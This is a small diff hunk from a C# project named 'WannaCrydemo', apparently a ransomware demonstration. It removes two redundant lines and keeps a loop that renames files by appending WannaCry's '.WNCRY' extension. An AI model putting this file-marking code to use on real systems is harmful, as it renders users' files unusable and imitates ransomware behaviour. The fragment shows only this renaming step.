@@ -67,9 +67,7 @@ namespace WannaCrydemo
                 if (isContain){}
                 else
                 {
-                    Path.GetExtension(files[i].FullName);
                     files[i].MoveTo(Path.ChangeExtension(files[i].FullName, files[i].Extension+ ".WNCRY"));
-                    Path.GetExtension(files[i].FullName);
                 }
             }
         }
